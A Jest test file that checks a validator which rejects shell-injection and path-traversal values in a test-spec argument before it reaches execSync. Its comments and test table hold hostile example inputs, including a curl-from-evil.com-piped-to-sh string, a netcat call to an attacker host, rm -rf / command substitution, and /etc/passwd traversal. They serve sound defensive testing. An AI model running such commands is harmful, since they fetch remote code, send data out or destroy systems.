/**
 * Tests for the shell-injection defense in `LocalFixValidator.runTest()`.
 *
 * Pre-v1.52.15 the validator did:
 *   cmd = cmd.replaceAll('{spec}', this.config.spec)
 *   execSync(cmd)
 * with no validation of `spec`. The simplified-analyzer regex
 *   /(?:Running:|File:|spec:)\s*([^\s]+\.[jt]sx?)/
 * would match attacker-controlled strings like
 *   "spec: a.ts;curl evil.com|sh;b.ts"
 * leading to RCE on the runner once the spec was substituted into the
 * shell command (`code_review_may_2026.md` Security #1).
 *
 * v1.52.15 added an early validation step: the spec must match the
 * strict pathspec regex `^[a-zA-Z0-9_\-./]+$`, must not contain `..`,
 * must resolve to a path INSIDE the cloned repo's workdir, and the
 * resolved path must exist on disk. These tests lock the contract.
 *
 * They drive `runTest()` directly and expect it to throw BEFORE it
 * reaches `execSync`, so we do not need to mock the actual subprocess.
 */
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { LocalFixValidator } from '../../src/services/local-fix-validator';

const fakeOctokit = {} as unknown as ConstructorParameters<typeof LocalFixValidator>[1];

/**
 * Build a validator whose private `_workDir` points at a real on-disk
 * directory we can populate. The test command is a shell no-op that
 * exits with code 1 — sufficient to drive `runTest()` past the
 * validation gate without spawning a real test runner. The validation
 * gate is what we're testing; the subprocess outcome doesn't matter.
 */
function makeValidator(spec: string, workDir: string): LocalFixValidator {
  const v = new LocalFixValidator(
    {
      owner: 'acme',
      repo: 'test',
      branch: 'main',
      githubToken: 'ghp_stub',
      // Trusted operator-controlled command; `{spec}` is the
      // attacker-controllable input we are validating before substitution.
      testCommand: 'echo "fake test for {spec}"; exit 1',
      spec,
    },
    fakeOctokit
  );
  // Set the private _workDir without going through async setup().
  // runTest() reads this.config.spec and this._workDir directly.
  (v as unknown as { _workDir: string })._workDir = workDir;
  return v;
}

let workDir: string;

beforeEach(() => {
  workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'triage-spec-validation-'));
  // Create a real repo-relative spec file so legitimate paths can pass.
  const subdir = path.join(workDir, 'test', 'specs');
  fs.mkdirSync(subdir, { recursive: true });
  fs.writeFileSync(path.join(subdir, 'login.spec.ts'), '// real test');
});

afterEach(() => {
  fs.rmSync(workDir, { recursive: true, force: true });
});

describe('runTest spec validation — shell-injection defense (code_review_may_2026 Security #1)', () => {
  test.each([
    ['semicolon command-chaining', 'a.ts;curl evil.com'],
    ['pipe', 'a.ts|nc attacker 9999'],
    ['ampersand', 'a.ts&background_cmd'],
    ['backtick command-sub', 'a.ts`whoami`'],
    ['dollar-paren command-sub', 'a.ts$(rm -rf /)'],
    ['redirection', 'a.ts>/tmp/pwn'],
    ['double quote', 'a.ts"foo'],
    ['single quote', "a.ts'foo"],
    ['whitespace embedded', 'a .ts'],
    ['newline embedded', 'a\n.ts'],
    ['null byte', 'a\u0000.ts'],
  ])('rejects spec containing %s', async (_name, spec) => {
    const v = makeValidator(spec, workDir);
    await expect(v.runTest()).rejects.toThrow(/Refusing to run test/);
  });

  test('rejects path traversal even when characters are otherwise safe', async () => {
    const v = makeValidator('../../../etc/passwd.ts', workDir);
    await expect(v.runTest()).rejects.toThrow(/contains|traversal/);
  });

  test('rejects absolute path outside the workdir', async () => {
    const v = makeValidator('/etc/passwd.ts', workDir);
    await expect(v.runTest()).rejects.toThrow();
  });

  test('rejects spec that passes the regex but does not exist in workdir', async () => {
    const v = makeValidator('test/specs/nonexistent.spec.ts', workDir);
    await expect(v.runTest()).rejects.toThrow(/does not exist/);
  });

  test('does NOT short-circuit on a clean repo-relative path that exists', async () => {
    // The spec is valid, so validation should NOT throw. The
    // shell-no-op test command exits 1, so runTest() resolves to a
    // result with passed=false (it does not throw on subprocess
    // failure). The point of this test is that we got PAST the
    // validation gate — confirmed by the resolved (non-thrown) result
    // and the absence of any "Refusing"-shaped message in the logs.
    const v = makeValidator('test/specs/login.spec.ts', workDir);
    const result = await v.runTest();
    expect(result.passed).toBe(false);
    expect(result.logs || '').not.toMatch(/Refusing to run test/);
    expect(result.logs || '').not.toMatch(/does not exist/);
    // The fake test command echoed the spec back; confirm substitution worked.
    expect(result.logs || '').toContain('test/specs/login.spec.ts');
  });
});
